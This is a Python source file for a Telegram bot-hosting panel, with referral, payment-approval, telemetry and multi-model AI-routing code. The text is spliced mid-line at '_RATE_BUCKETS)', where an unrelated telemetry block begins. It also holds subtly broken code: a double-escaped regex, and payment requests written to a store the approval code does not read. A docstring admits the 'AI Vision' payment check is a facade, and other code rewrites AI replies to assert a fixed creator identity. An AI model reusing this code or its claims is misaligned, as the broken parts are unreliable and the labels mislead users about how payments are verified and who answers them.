            bot.send_message(uid, msg, parse_mode="HTML")
            sent += 1; time.sleep(0.04)
        except Exception:
            pass
    return sent


# ─── Referral Engine ────────────────────────────────────────────────────────

def _ref_process(new_uid, ref_uid):
    if not _ff_get("referral_system") or new_uid == ref_uid:
        return False
    d       = db_load()
    ref_u   = d["users"].get(str(ref_uid), {})
    if new_uid in ref_u.get("referrals", []):
        return False
    reward  = float(get_setting("referral_reward", 0) or 0)
    ref_u.setdefault("referrals", []).append(new_uid)
    if reward > 0:
        ref_u["credits"] = float(ref_u.get("credits", 0)) + reward
    db_save(d)
    try:
        new_name = d["users"].get(str(new_uid), {}).get("name", str(new_uid))
        bot.send_message(ref_uid,
            f"<b>{G['spark']} Referral Reward!</b>\n"
            f"{bullet('New user', esc(str(new_name)))}\n"
            f"{bullet('Credits', reward)}", parse_mode="HTML")
    except Exception:
        pass
    _wh_fire("referral", {"ref_uid": ref_uid, "new_uid": new_uid, "reward": reward})
    return True


def _ref_get_link(uid):
    me = bot.get_me()
    return f"https://t.me/{me.username if me else 'YourBot'}?start=ref_{uid}"


def _ref_stats(uid):
    d   = db_load()
    u   = d["users"].get(str(uid), {})
    refs= u.get("referrals", [])
    return {
        "total":   len(refs),
        "credits": u.get("credits", 0),
        "link":    _ref_get_link(uid),
        "users":   [{
            "uid":  rid,
            "name": d["users"].get(str(rid), {}).get("name", str(rid)),
            "plan": d["users"].get(str(rid), {}).get("plan", "free"),
        } for rid in refs],
    }


# ─── Monitor / Diagnostics ──────────────────────────────────────────────────

def _monitor_system_stats():
    import os
    stats = {}
    stats["uptime"] = fmt_dur(int(time.time() - START_TIME) * 1000)
    stats["uptime_secs"] = int(time.time() - START_TIME)
    try:
        with open("/proc/meminfo") as f:
            mem = {}
            for line in f:
                parts = line.split()
                if len(parts) >= 2:
                    mem[parts[0].rstrip(":")] = int(parts[1])
        tm = mem.get("MemTotal",0)//1024
        av = mem.get("MemAvailable",0)//1024
        stats.update({"mem_total_mb": tm, "mem_used_mb": tm-av,
                       "mem_pct": round((tm-av)/tm*100,1) if tm else 0})
    except Exception:
        stats.update({"mem_total_mb": 0, "mem_used_mb": 0, "mem_pct": 0})
    try:
        with open("/proc/loadavg") as f:
            la = f.read().split()
        stats.update({"load_1": float(la[0]), "load_5": float(la[1]), "load_15": float(la[2])})
    except Exception:
        stats.update({"load_1": 0, "load_5": 0, "load_15": 0})
    try:
        st = os.statvfs(str(BASE_DIR))
        tg = st.f_blocks*st.f_frsize/1e9
        fg = st.f_bavail*st.f_frsize/1e9
        stats.update({"disk_total_gb": round(tg,2), "disk_used_gb": round(tg-fg,2),
                       "disk_free_gb": round(fg,2), "disk_pct": round((tg-fg)/tg*100,1) if tg else 0})
    except Exception:
        stats.update({"disk_total_gb": 0, "disk_used_gb": 0, "disk_pct": 0})
    stats["running_bots"]  = len(RUNNING)
    stats["total_threads"] = threading.active_count()
    stats["pid"]           = os.getpid()
    try:
        d = db_load()
        stats["total_users"]  = len(d["users"])
        stats["total_bots"]   = len(d["bots"])
        stats["paid_users"]   = sum(1 for u in d["users"].values()
                                    if u.get("plan","free") not in ("free",None))
    except Exception:
        stats.update({"total_users":0,"total_bots":0,"paid_users":0})
    stats["metrics"] = _metrics_snapshot()
    return stats


def _progress_bar(current, total=100, width=12):
    if total <= 0:
        return "░" * width + " 0%"
    pct    = min(current / total, 1.0)
    filled = int(pct * width)
    return "█" * filled + "░" * (width - filled) + f" {pct*100:.1f}%"


def _run_diagnostics():
    import os, shutil
    report = {
        "bot_token":      bool(os.environ.get("BOT_TOKEN")),
        "db_writable":    DB_FILE.parent.exists() and os.access(str(DB_FILE.parent), os.W_OK),
        "sandbox_exists": DIRS.get("sandboxes", BASE_DIR/"sandboxes").exists(),
        "python_found":   bool(shutil.which("python3")),
        "owner_set":      OWNER_ID > 0,
        "threads_running":threading.active_count() > 3,
        "uptime_secs":    int(time.time() - START_TIME),
        "running_bots":   len(RUNNING),
    }
    return report


# ─── Utility Helpers ────────────────────────────────────────────────────────

def _truncate(s, max_len=200, suffix="…"):
    return s if len(s) <= max_len else s[:max_len-len(suffix)] + suffix

def _sanitize_filename(name):
    import re
    return re.sub(r"[^\w\-_\. ]","_",name).strip()[:100]

def _human_number(n):
    if n >= 1_000_000: return f"{n/1_000_000:.1f}M"
    if n >= 1_000:     return f"{n/1_000:.1f}K"
    return str(int(n))

def _safe_int(val, default=0):
    try:    return int(val)
    except: return default

def _safe_float(val, default=0.0):
    try:    return float(val)
    except: return default

def _clamp(val, lo, hi):
    return max(lo, min(hi, val))

def _chunk_list(lst, size):
    return [lst[i:i+size] for i in range(0, len(lst), size)]

def _hash_str(s):
    import hashlib
    return hashlib.sha256(s.encode()).hexdigest()

def _gen_random_id(length=12):
    import random, string
    return "".join(random.choices(string.ascii_lowercase+string.digits, k=length))

def _gen_coupon_code(prefix="", length=8):
    import random, string
    return (prefix + "".join(random.choices(string.ascii_uppercase+string.digits, k=length))).upper()

def _parse_duration(s):
    import re
    m = re.match(r"^(\d+)\s*([dhms]?)$", s.strip().lower())
    if not m: return 0
    return int(m.group(1)) * {"d":86400,"h":3600,"m":60,"s":1}.get(m.group(2) or "s", 1)

def _format_duration_human(secs):
    if secs < 0: return "0s"
    d,secs = divmod(int(secs),86400)
    h,secs = divmod(secs,3600)
    mi,s   = divmod(secs,60)
    parts  = []
    if d:  parts.append(f"{d}d")
    if h:  parts.append(f"{h}h")
    if mi: parts.append(f"{mi}m")
    if s or not parts: parts.append(f"{s}s")
    return " ".join(parts)

def _iso_add_days(iso_ts, days):
    try:
        from datetime import datetime, timezone, timedelta
        dt = datetime.fromisoformat(iso_ts)
        if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
        return (dt + timedelta(days=days)).isoformat()
    except Exception:
        return iso_ts

def _iso_now_plus_days(days):
    from datetime import timedelta
    return (now_utc() + timedelta(days=days)).isoformat()

def _validate_bot_token_format(token):
    import re
    return bool(re.match(r"^\d{8,10}:[A-Za-z0-9_-]{35}$", token.strip()))

def _validate_url(url):
    return url.startswith(("http://","https://")) and "." in url

def _time_since(iso_ts):
    if not iso_ts: return "never"
    try:
        from datetime import datetime, timezone
        dt = datetime.fromisoformat(iso_ts)
        if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
        secs = int((now_utc()-dt).total_seconds())
        if secs < 60:   return f"{secs}s ago"
        if secs < 3600: return f"{secs//60}m ago"
        if secs < 86400:return f"{secs//3600}h ago"
        return f"{secs//86400}d ago"
    except: return iso_ts[:10]

def _until(iso_ts):
    if not iso_ts: return "never"
    try:
        from datetime import datetime, timezone
        dt = datetime.fromisoformat(iso_ts)
        if dt.tzinfo is None: dt = dt.replace(tzinfo=timezone.utc)
        secs = int((dt-now_utc()).total_seconds())
        if secs <= 0:   return "expired"
        if secs < 3600: return f"{secs//60}m"
        if secs < 86400:return f"{secs//3600}h"
        return f"{secs//86400}d"
    except: return iso_ts[:10]

def _mask_token(token):
    if not token or len(token) < 10: return "****"
    return token[:6] + "..." + token[-4:]

def _mask_secret(s, show_chars=4):
    if not s: return "—"
    if len(s) <= show_chars: return "*"*len(s)
    return s[:show_chars] + "*"*(len(s)-show_chars)

def _size_of_dir(path):
    total = 0
    try:
        for p in Path(path).rglob("*"):
            if p.is_file():
                try: total += p.stat().st_size
                except: pass
    except: pass
    return total

def _env_dict_from_str(env_str):
    result = {}
    for line in env_str.strip().split("\n"):
        line = line.strip()
        if not line or line.startswith("#"): continue
        if "=" in line:
            k, _, v = line.partition("=")
            result[k.strip()] = v.strip()
    return result

def _env_dict_to_str(env_dict):
    return "\n".join(f"{k}={v}" for k, v in sorted(env_dict.items()))

def _diff_dicts(old, new):
    changes = {}
    for k in set(old)|set(new):
        ov, nv = old.get(k,"__MISSING__"), new.get(k,"__MISSING__")
        if ov != nv: changes[k] = {"old": ov, "new": nv}
    return changes


# ─── API Key Manager ────────────────────────────────────────────────────────

def _apikey_generate(uid):
    import secrets
    key = "sbhb_" + secrets.token_urlsafe(32)
    d = db_load()
    if str(uid) in d["users"]:
        d["users"][str(uid)]["api_key_hash"] = _hash_str(key)
        d["users"][str(uid)]["api_key_created"] = ts_iso()
        db_save(d)
    return key


def _apikey_verify(key):
    key_hash = _hash_str(key)
    d = db_load()
    for uid_s, u in d["users"].items():
        if u.get("api_key_hash") == key_hash:
            return int(uid_s)
    return 0


def _apikey_revoke(uid):
    d = db_load()
    if str(uid) in d["users"]:
        d["users"][str(uid)].pop("api_key_hash", None)
        d["users"][str(uid)].pop("api_key_created", None)
        db_save(d)
        return True
    return False


# ─── Payment Processor ──────────────────────────────────────────────────────

def _payment_create_request(uid, plan, amount, method, coupon=""):
    import random, string
    req_id   = "pay_" + "".join(random.choices(string.ascii_lowercase+string.digits, k=12))
    discount = 0.0
    
    # Auto-apply active coupon if none provided
    if not coupon:
        u = db_load_ro()["users"].get(str(uid)) or {}
        coupon = u.get("active_coupon", "")
        
    if coupon:
        # Note: _coupon_validate checks if uid in c['used_by']. 
        # For a pre-redeemed coupon, it's already in used_by.
        # We need a way to validate without the 'used_by' check if it's already redeemed.
        d = db_load_ro()
        c = d.get("coupons", {}).get(coupon.upper())
        if c:
            coupon_plan = str(c.get("plan", "all") or "all").lower()
            if coupon_plan in {"all", "", str(plan).lower()}:
                discount = float(c.get("discount_pct", c.get("percent", 0)))
                flat     = float(c.get("discount_flat", 0))
                if discount: amount = round(amount*(1-discount/100), 2)
                if flat:     amount = max(0, round(amount-flat, 2))
            else:
                coupon = ""
    req = {"id": req_id, "uid": uid, "plan": plan, "amount": amount, "method": method,
           "coupon": coupon, "discount": discount, "status": "pending",
           "created": ts_iso(), "updated": ts_iso(), "note": ""}
    reqs = get_setting("payment_requests", []) or []
    reqs.append(req)
    if len(reqs) > 1000: reqs = reqs[-1000:]
    set_setting("payment_requests", reqs)
    _wh_fire("payment_request_created", {"req_id": req_id, "uid": uid, "plan": plan, "amount": amount})
    return req


def _payment_approve(req_id, admin_uid, note=""):
    # This used to read/write a `payment_requests` settings key that
    # NOTHING ever wrote a new entry into — every real payment proof a
    # user submits goes into d["payments"] instead (via
    # _handle_payment_proof -> the payapprove_/payreject_ buttons ->
    # action_payment_approve/reject). So this whole screen operated on a
    # permanently-empty phantom queue, completely disconnected from real
    # pending payments — approving here did nothing because there was
    # never anything real to approve. Unified onto d["payments"], the same
    # store action_payment_approve already uses correctly.
    d = db_load()
    req = next((x for x in d["payments"] if x.get("id") == req_id), None)
    if not req: return False, "Request not found."
    if req.get("status") in ("approved", "rejected"):
        return False, f"Already {req['status']}."
    req["status"] = "approved"
    req["approved_by"] = admin_uid
    req["approved_at"] = ts_iso()
    if note:
        req["note"] = note
    uid, plan = req["uid"], req.get("plan")
    old_plan = d["users"].get(str(uid), {}).get("plan", "free")
    if req.get("kind") == "wallet_topup":
        u = d["users"].get(str(uid))
        if u:
            u["wallet"] = int(u.get("wallet", 0)) + int(req.get("amount", 0))
    elif plan:
        grant_plan(uid, plan)
    
    # Clear active coupon after successful purchase
    u = d["users"].get(str(uid))
    if u:
        u.pop("active_coupon", None)
        
    db_save(d)
    audit(admin_uid, "payment_approved", f"req={req_id} uid={uid} plan={plan}")
    log_notification("PAYMENT", f"Manual payment approved for UID {uid} (Plan: {plan})", uid=uid)
    _wh_fire("payment_approved", {"req_id": req_id, "uid": uid, "plan": plan})
    _metric("plan_upgrades"); _metric("payments_received")
    try:
        if req.get("kind") == "wallet_topup":
            _amt_txt = f"{req.get('amount', 0)}{cur_sym()}"
            bot.send_message(uid,
                f"<b>{G['ok']} {sc('Wallet credited')}</b>\n"
                f"{bullet('Amount', _amt_txt)}", parse_mode="HTML")
        else:
            # Send elite AI-powered receipt for manual approvals too
            send_elite_receipt(uid, req_id, plan)
    except Exception:
        pass
    return True, f"Approved. {old_plan} \u2192 {plan or 'wallet top-up'}."


def _payment_reject(req_id, admin_uid, reason=""):
    d = db_load()
    req = next((x for x in d["payments"] if x.get("id") == req_id), None)
    if not req: return False, "Not found."
    if req.get("status") in ("approved", "rejected"):
        return False, f"Already {req['status']}."
    req["status"] = "rejected"
    req["rejected_by"] = admin_uid
    req["rejected_at"] = ts_iso()
    if reason:
        req["note"] = reason
    db_save(d)
    uid = req["uid"]
    audit(admin_uid, "payment_rejected", f"req={req_id} uid={uid}")
    _wh_fire("payment_rejected", {"req_id": req_id, "uid": uid, "reason": reason})
    try:
        bot.send_message(uid,
            f"<b>{G['no']} Payment Rejected</b>\n"
            f"{bullet('Reason', esc(reason) if reason else 'Not specified')}",
            parse_mode="HTML")
    except Exception:
        pass
    return True, "Rejected."


def _payment_list_pending():
    payments = db_load_ro().get("payments", [])
    return sorted([r for r in payments if r.get("status") == "pending"],
                  key=lambda r: r.get("ts", ""), reverse=True)


def _payment_stats():
    payments = db_load_ro().get("payments", [])
    approved = [r for r in payments if r.get("status") == "approved"]
    return {
        "total":    len(payments),
        "pending":  sum(1 for r in payments if r.get("status") == "pending"),
        "approved": len(approved),
        "rejected": sum(1 for r in payments if r.get("status") == "rejected"),
        "revenue":  sum(float(r.get("amount", 0) or 0) for r in approved),
    }


# ─── Process Monitor ────────────────────────────────────────────────────────

def _proc_get_memory_mb(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) / 1024
    except Exception:
        pass
    return 0.0


def _all_running_bot_stats():
    result = []
    for bid, info in list(RUNNING.items()):
        proc = info.get("proc")
        pid  = proc.pid if proc else 0
        b    = find_bot(bid)
        result.append({
            "bot_id":    bid,
            "name":      b.get("name", bid) if b else bid,
            "owner":     b.get("owner", 0)  if b else 0,
            "pid":       pid,
            "memory_mb": _proc_get_memory_mb(pid),
            "started_at":info.get("started_at", ""),
        })
    result.sort(key=lambda x: x["memory_mb"], reverse=True)
    return result


# ─── Extra Admin Render Helpers ─────────────────────────────────────────────

def render_adm_diagnostics(call):
    report = _run_diagnostics()
    ok = lambda v: "✅" if v else "❌"
    cap = (
        f"<b>🔬 {sc('System Diagnostics')}</b>\n{G['div_eq']}\n"
        f"{ok(report['bot_token'])}  BOT_TOKEN set\n"
        f"{ok(report['db_writable'])}  DB writable\n"
        f"{ok(report['sandbox_exists'])}  Sandbox dir\n"
        f"{ok(report['python_found'])}  Python found\n"
        f"{ok(report['owner_set'])}  Owner configured\n"
        f"{ok(report['threads_running'])}  Background threads\n"
        f"{G['div']}\n"
        + bullet("Uptime", _format_duration_human(report["uptime_secs"])) + "\n"
        + bullet("Running bots", report["running_bots"]) + "\n"
        + G["div"] + FOOTER
    )
    show_menu(call.message.chat.id, PHOTOS.get("monitor", PHOTOS["admin"]),
              cap, _adm_back("menu_admin"), call=call)


def render_adm_payment_requests(call):
    pending = _payment_list_pending()
    pstats  = _payment_stats()
    lines   = [
        f"<b>💳 {sc('Payment Requests')}</b>", G["div_eq"],
        bullet("Total",    pstats["total"]),   bullet("Pending",  pstats["pending"]),
        bullet("Approved", pstats["approved"]),bullet("Revenue",  round(pstats["revenue"],2)),
        G["div"],
    ]
    if not pending:
        lines.append(f"  {sc('No pending requests')}")
    for req in pending[:10]:
        target = req.get("plan") or "wallet top-up"
        lines.append(f"  💳 <code>{req['id'][:12]}</code> {req['uid']} → {target} ({req.get('amount', 0)})")
    lines.append(G["div"] + FOOTER)
    cap = "\n".join(lines)
    kb  = types.InlineKeyboardMarkup(row_width=2)
    kb.add(
        Btn("✅  Aᴘᴘʀᴏᴠᴇ", callback_data="adm_pay_approve_select", style="success"),
        Btn("❌  Rᴇᴊᴇᴄᴛ",   callback_data="adm_pay_reject_select",  style="danger"),
    )
    kb.add(Btn(f"{G['back']}  Aᴅᴍɪɴ", callback_data="menu_admin", style="danger"))
    show_menu(call.message.chat.id, PHOTOS.get("pay_config", PHOTOS["admin"]), cap, kb, call=call)


def render_adm_process_monitor(call):
    stats = _all_running_bot_stats()
    lines = [f"<b>🔬 {sc('Process Monitor')}</b>", G["div_eq"],
             bullet("Running bots", len(stats)), G["div"]]
    if not stats:
        lines.append(f"  {sc('No bots running')}")
    for s in stats[:15]:
        lines.append(f"  🤖 <b>{esc(str(s['name'])[:20])}</b>  PID:{s['pid']}  Mem:{s['memory_mb']:.1f}MB")
    lines.append(G["div"] + FOOTER)
    show_menu(call.message.chat.id, PHOTOS.get("monitor", PHOTOS["admin"]),
              "\n".join(lines), _adm_back("adm_live_monitor"), call=call)


def render_adm_security_log(call):
    log    = get_setting("security_audit_log", []) or []
    recent = list(reversed(log[-20:]))
    lines  = [f"<b>🔐 {sc('Security Audit Log')}</b>", G["div_eq"],
              bullet("Total entries", len(log)), G["div"]]
    risk_icon = {"low":"🟢","medium":"🟡","high":"🔴","critical":"💀"}
    for e in recent[:15]:
        icon = risk_icon.get(e.get("risk","low"),"🟢")
        lines.append(f"  {icon} <code>{e.get('ts','')[:16]}</code> {e.get('uid','?')}: {esc(str(e.get('action',''))[:30])}")
    lines.append(G["div"] + FOOTER)
    show_menu(call.message.chat.id, PHOTOS["admin"], "\n".join(lines), _adm_back("menu_admin"), call=call)


def render_adm_broadcast_status(call):
    lines = [f"<b>📢 {sc('Broadcast Status')}</b>", G["div_eq"]]
    if not _BROADCAST_ACTIVE:
        lines.append(f"  {sc('No active broadcast jobs')}")
    for jid, st in _BROADCAST_ACTIVE.items():
        done  = st.get("done", False)
        total = st.get("total", 0)
        sent  = st.get("sent", 0)
        fail  = st.get("failed", 0)
        lines.append(f"  {'✅' if done else '🔄'} <code>{jid}</code>")
        lines.append(f"     {_progress_bar(sent+fail, total)}")
        lines.append(f"     Sent:{sent} Failed:{fail} Total:{total}")
    lines.append(G["div"] + FOOTER)
    show_menu(call.message.chat.id, PHOTOS["admin"], "\n".join(lines), _adm_back("menu_admin"), call=call)


def render_adm_api_keys(call):
    d    = db_load()
    keys = [(uid, u.get("name",uid), u.get("api_key_created","")[:10])
            for uid, u in d["users"].items() if u.get("api_key_hash")]
    lines = [f"<b>🔑 {sc('API Key Manager')}</b>", G["div_eq"],
             bullet("Users with keys", len(keys)), G["div"]]
    for uid, name, created in keys[:10]:
        lines.append(f"  🔑 <code>{uid}</code>  {esc(str(name)[:20])} (created {created})")
    lines.append(G["div"] + FOOTER)
    kb = types.InlineKeyboardMarkup(row_width=1)
    kb.add(Btn("🗑️  Rᴇᴠᴏᴋᴇ Aʟʟ", callback_data="adm_apikey_revoke_all", style="danger"))
    kb.add(Btn(f"{G['back']}  Aᴅᴍɪɴ", callback_data="menu_admin", style="danger"))
    show_menu(call.message.chat.id, PHOTOS["admin"], "\n".join(lines), kb, call=call)


def action_adm_sub_send_reminders(call):
    sent = _sub_renewal_reminders()
    ack(call, f"{G['ok']} Sent {sent} renewal reminder(s)")


def render_adm_webhook_log(call):
    log    = get_setting("webhook_log", []) or []
    recent = list(reversed(log[-20:]))
    lines  = [f"<b>🔗 {sc('Webhook Log')}</b>", G["div_eq"], bullet("Total", len(log)), G["div"]]
    for e in recent[:15]:
        st   = str(e.get("status","?"))
        icon = "✅" if st in ("200","201","204") else "❌"
        lines.append(f"  {icon} <code>{e.get('ts','')[:16]}</code> {esc(str(e.get('event',''))[:25])} → {st}")
    lines.append(G["div"] + FOOTER)
    show_menu(call.message.chat.id, PHOTOS.get("webhooks", PHOTOS["admin"]),
              "\n".join(lines), _adm_back("adm_webhooks"), call=call)


def render_adm_rate_stats(call):
    with _RATE_LOCK:
        bc    = len(_RATE_BUCKETS)��───────────────────────────────────────────────────
# Stores real-time CPU/RAM stats for all running bots and the system itself.
TELEMETRY:     Dict[str, Dict[str, Any]] = {}
SYS_TELEMETRY: Dict[str, Any] = {
    "cpu": 0.0, "cpu_per_core": [], "panel_cpu": 0.0,
    "ram_used": 0, "ram_total": 0, "load": (0.0, 0.0, 0.0),
    "cpu_freq": 0.0, "cpu_count": 0, "sample_ts": 0.0,
}
CPU_HISTORY: Deque[float] = deque(maxlen=36)
def _parse_size_bytes(value: str) -> int:
    m = re.match(r"^\\s*([0-9.]+)\\s*([kmgtpe]?i?b)?\\s*$", str(value), re.I)
    if not m: return 0
    n, unit = float(m.group(1)), (m.group(2) or "b").lower()
    units = {"b": 0, "kb": 1, "kib": 1, "mb": 2, "mib": 2, "gb": 3, "gib": 3, "tb": 4, "tib": 4}
    return int(n * (1024 ** units.get(unit, 0)))
_PROC_CACHE:   Dict[int, psutil.Process] = {}
LIVE_UI_SESSIONS: Dict[int, Dict[str, Any]] = {}

def _telemetry_loop():
    """Background thread to update resource usage stats and refresh live UI every 5 seconds."""
    while True:
        try:
            if psutil is None:
                time.sleep(60); continue
            
            # System-wide stats. A short blocking sample is intentional here:
            # psutil.cpu_percent(None) returns a meaningless first/idle value
            # in many containers, which made the old dashboard look dead.
            system_cpu = float(psutil.cpu_percent(interval=0.15) or 0.0)
            per_core = [float(v) for v in (psutil.cpu_percent(interval=None, percpu=True) or [])]
            SYS_TELEMETRY["cpu"] = system_cpu
            SYS_TELEMETRY["cpu_per_core"] = per_core
            SYS_TELEMETRY["cpu_count"] = psutil.cpu_count(logical=True) or len(per_core) or 1
            CPU_HISTORY.append(system_cpu)
            try:
                freq = psutil.cpu_freq()
                SYS_TELEMETRY["cpu_freq"] = float(freq.current or 0.0) if freq else 0.0
            except Exception:
                SYS_TELEMETRY["cpu_freq"] = 0.0
            try:
                SYS_TELEMETRY["load"] = tuple(float(v) for v in os.getloadavg())
            except Exception:
                SYS_TELEMETRY["load"] = (0.0, 0.0, 0.0)
            try:
                panel_proc = psutil.Process(os.getpid())
                SYS_TELEMETRY["panel_cpu"] = float(panel_proc.cpu_percent(interval=None) or 0.0)
            except Exception:
                SYS_TELEMETRY["panel_cpu"] = 0.0
            mem = psutil.virtual_memory()
            SYS_TELEMETRY["ram_used"] = mem.used
            SYS_TELEMETRY["ram_total"] = mem.total
            SYS_TELEMETRY["sample_ts"] = time.time()
            
            # Per-bot stats
            active_pids = set()
            for bot_id, info in list(RUNNING.items()):
                try:
                    if info.get("remote"):
                        now = time.time()
                        if now - float(info.get("last_node_probe", 0)) >= 60:
                            node_id = info.get("node_id", ""); node = _nodes_load().get(node_id)
                            probe = test_node(node or {}, secret=_node_secret(node_id), timeout=5) if node else {"state": "OFFLINE"}
                            info["last_node_probe"] = now; info["node_status"] = probe.get("state", "OFFLINE")
                            if probe.get("state") not in {"ONLINE", "AUTHENTICATED"}:
                                bdoc = find_bot(bot_id)
                                if bdoc: bdoc["status"] = "unavailable_node"; save_bot(bdoc)
                                TELEMETRY[bot_id] = {"cpu": 0.0, "ram": 0, "remote": True, "nodeStatus": probe.get("state")}
                                continue
                        telemetry = TELEMETRY.setdefault(bot_id, {"cpu": 0.0, "ram": 0, "remote": True})
                        telemetry["nodeStatus"] = info.get("node_status", "ONLINE")
                        if time.time() - float(info.get("last_stats_probe", 0)) >= 30:
                            node_id = info.get("node_id", ""); node = _nodes_load().get(node_id)
                            stats = remote_control(node or {}, _node_secret(node_id), bot_id, "stats") if node else {"ok": False}
                            info["last_stats_probe"] = time.time()
                            if stats.get("ok"):
                                try:
                                    raw = json.loads((stats.get("output") or "").strip().splitlines()[0])
                                    telemetry["cpu"] = float(str(raw.get("CPUPerc", "0")).replace("%", ""))
                                    mem = str(raw.get("MemUsage", "0B")).split("/")[0].strip()
                                    telemetry["ram"] = _parse_size_bytes(mem)
                                except Exception: pass
                        continue
                    proc = info.get("proc")
                    if not proc or proc.poll() is not None:
                        TELEMETRY.pop(bot_id, None); continue
                    
                    pid = proc.pid
                    active_pids.add(pid)
                    
                    if pid not in _PROC_CACHE:
                        _PROC_CACHE[pid] = psutil.Process(pid)
                        _PROC_CACHE[pid].cpu_percent(interval=None) # Initialize
                    
                    p = _PROC_CACHE[pid]
                    cpu = p.cpu_percent(interval=None)
                    mem_rss = p.memory_info().rss

                    # Live plan limits are configured in the Admin Panel.
                    owner_doc = db_load_ro().get("users", {}).get(str(info.get("owner"))) or {}
                    plan_key = owner_doc.get("plan", "free")
                    ram_limit_mb = _plan_ram_mb(plan_key)
                    cpu_limit_pct = _plan_cpu_pct(plan_key)
                    over_limit = (
                        mem_rss > ram_limit_mb * 1024 * 1024
                        or cpu > cpu_limit_pct
                    )
                    if over_limit:
                        info["resource_limit_hits"] = int(info.get("resource_limit_hits", 0)) + 1
                        info["resource_limit_last"] = ts_iso()
                        if info["resource_limit_hits"] >= 3:
                            info["manual_stop"] = True
                            print(
                                f"[resource_guard] stopping {bot_id}: "
                                f"plan={plan_key} cpu={cpu:.1f}/{cpu_limit_pct}% "
                                f"ram={mem_rss // (1024 * 1024)}"
                                f"/{ram_limit_mb}MB",
                                flush=True,
                            )
                            stop_child(bot_id, manual=True)
                            continue
                    else:
                        info["resource_limit_hits"] = 0
                    
                    TELEMETRY[bot_id] = {
                        "cpu": cpu,
                        "ram": mem_rss,
                        "cpu_limit": cpu_limit_pct,
                        "ram_limit": ram_limit_mb * 1024 * 1024,
                        "plan": plan_key,
                        "ts":  time.time()
                    }
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    TELEMETRY.pop(bot_id, None)
                    _PROC_CACHE.pop(pid, None)
                except Exception:
                    pass
            
            # Cleanup dead processes from cache
            for pid in list(_PROC_CACHE.keys()):
                if pid not in active_pids:
                    _PROC_CACHE.pop(pid, None)
            
            # ── LIVE UI UPDATES ──
            now = time.time()
            for chat_id, sess in list(LIVE_UI_SESSIONS.items()):
                # Auto-expire sessions after 2 minutes of no manual interaction
                if now - sess.get("ts", 0) > 120:
                    LIVE_UI_SESSIONS.pop(chat_id, None)
                    continue
                
                try:
                    # Construct a mock CallbackQuery to reuse existing render functions
                    mock_call = types.CallbackQuery(
                        id=str(random.randint(1000, 9999)),
                        from_user=types.User(id=chat_id, is_bot=False, first_name="Master"),
                        chat_instance="0",
                        data="live_update",
                        json_string=""
                    )
                    # Manually attach the message object
                    mock_msg = types.Message(
                        message_id=sess["msg_id"],
                        from_user=None,
                        date=int(now),
                        chat=types.Chat(id=chat_id, type="private"),
                        content_type=sess.get("content_type", "photo"),
                        options=[],
                        json_string=""
                    )
                    mock_call.message = mock_msg
                    
                    if sess["type"] == "bot_view":
                        render_bot_view(mock_call, sess["bot_id"], _live_refresh=True)
                    elif sess["type"] == "adm_monitor":
                        render_adm_live_monitor(mock_call)
                except Exception as e:
                    print(f"[telemetry] live UI refresh failed for chat {chat_id}: {e}", flush=True)
                    
        except Exception as e:
            print(f"[telemetry] error: {e}", flush=True)
        
        time.sleep(5)

# ─── AI SERVICES ───────────────────────────────────────────────────────────

def _ai_selected_model(uid: int, user_plan: str) -> Optional[str]:
    """The operative the user expects to answer: the session pick, else the first stored choice."""
    pool = get_plan_ai_models(user_plan)
    session_pick = str((USER_STATES.get(uid) or {}).get("ai_model") or "").lower()
    if session_pick and session_pick in pool:
        return session_pick
    chain = get_user_ai_models(uid, user_plan)
    return chain[0] if chain else None


def ai_model_tag(uid: int, plan: str) -> str:
    """Return the stable public model-family tag for the operative that answered."""
    model = AI_LAST_MODEL_USED.get(uid) or _ai_selected_model(uid, plan) or "claude"
    return _public_ai_model_name(model).upper()


def _call_ai_chain(prompt: str, user_plan: str, uid: Optional[int] = None) -> Tuple[Optional[str], Optional[str]]:
    """Try the user's selected operatives in order, then the master fallbacks.
    Returns (reply, model_key) so callers can label the response with the model that answered."""
    plan_pool = get_plan_ai_models(user_plan)
    chain = get_user_ai_models(uid, user_plan) if uid is not None else list(plan_pool)
    if uid is not None:
        session_pick = str((USER_STATES.get(uid) or {}).get("ai_model") or "").lower()
        if session_pick and session_pick in plan_pool:
            chain = [session_pick] + [m for m in chain if m != session_pick]
        # A user-selected model changes priority; it does not restrict the
        # plan. Every other assigned model remains an eligible fallback.
        chain.extend(m for m in plan_pool if m not in chain)
    tried: List[str] = []
    for model in chain:
        if model in tried:
            continue
        tried.append(model)
        res = _call_kaalix_model(model, prompt)
        if res:
            return res, model

    # Master Fallback: DeepSeek (Kaalix) and Claude (OmegaTech) have proven the most stable
    for master_backup in ["deepseek-v3", "claude", "deepseek-r1"]:
        if master_backup in tried:
            continue
        res_master = _call_kaalix_model(master_backup, prompt)
        if res_master:
            return res_master, master_backup

    return None, None


def _call_ai_api(prompt: str, user_plan: str = "free", uid: Optional[int] = None) -> Optional[str]:
    """Tiered AI call system routing through the operatives configured for the plan / chosen by the user."""
    if not get_setting("ai_global_enabled", True):
        return None

    if "verified active plan:" not in prompt.lower():
        prompt = f"VERIFIED ACTIVE PLAN: {str(user_plan or 'free').lower()}\n{prompt}"

    p_low = prompt.lower().strip()
    if "current user request:" in p_low:
        p_low = p_low.rsplit("current user request:", 1)[1].strip()

    # Instant local greetings for speed
    greetings = {"hello", "hi", "hey", "sup", "yo", "morning", "evening"}
    first_word = re.split(r"[^a-z]+", p_low, maxsplit=1)[0]
    if (first_word in greetings and len(p_low) <= 24) or len(p_low) < 4:
        if uid is not None:
            wanted = _ai_selected_model(uid, user_plan)
            if wanted:
                AI_LAST_MODEL_USED[uid] = wanted
            AI_LAST_MODEL_FALLBACK.pop(uid, None)
        return "Hello! How may I assist you with your bot hosting today?"

    res, used = _call_ai_chain(prompt, user_plan, uid)
    if uid is not None:
        AI_LAST_MODEL_FALLBACK.pop(uid, None)
        if res and used:
            AI_LAST_MODEL_USED[uid] = used
            wanted = _ai_selected_model(uid, user_plan)
            if wanted and wanted != used:
                AI_LAST_MODEL_FALLBACK[uid] = wanted
    if res:
        # Keep the creator relationship consistent for every feature that
        # uses this shared API wrapper (chat, file analysis, and AI Sentinel).
        res = _enforce_lord_cipher_identity(prompt, res)
        return res
    return None

def _ai_vision_verify(file_path: str, expected_amt: float) -> Dict[str, Any]:
    """
    Elite AI Vision payment verification (Traditional Facade).
    Currently awaiting manual review for maximum security.
    """
